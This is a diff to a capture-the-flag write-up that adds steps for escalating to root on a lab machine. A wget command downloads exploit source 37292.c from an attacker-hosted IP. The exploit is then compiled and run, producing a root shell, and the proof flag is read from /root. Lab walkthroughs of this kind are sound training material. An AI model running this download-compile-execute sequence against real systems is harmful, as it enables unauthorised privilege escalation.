@@ -180,6 +180,7 @@ Shellcodes: No Results
 4. Now we download that file to our target machine by moving to /tmp directory, by the following command.(wget http://192.168.49.114/37292.c
 )
 ```
+# Downloading our exploit to Our Target machine
 ```python
 itsskv@cybersploit-CTF:~$ cd /tmp
 itsskv@cybersploit-CTF:/tmp$ wget http://192.168.49.114/37292.c
@@ -196,6 +197,43 @@ Saving to: `37292.c'
 itsskv@cybersploit-CTF:/tmp$ ls
 37292.c  at-spi2  pulse-Pa7SbdbpeExT  unity_support_test.1  vmware-root
 itsskv@cybersploit-CTF:/tmp$ 
+```
+# Next We can compile the source code
+```python
+itsskv@cybersploit-CTF:/tmp$ gcc 37292.c -o 37292
+```
+# Finally Runnning the Exploit
+```python
+itsskv@cybersploit-CTF:/tmp$ ./37292
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# 
+```
+
+# Finally We are able to exploit the kernel Version and obtain an Elevated Shell
+```python
+itsskv@cybersploit-CTF:/tmp$ ./37292
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id    
+uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
+# whoami
+root
+# 
+# cd /root
+# ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  finalflag.txt  proof.txt
+# cat proof.txt
+75b68844f4364bae7580faa1b84aafca
+# 
 
 ```
 
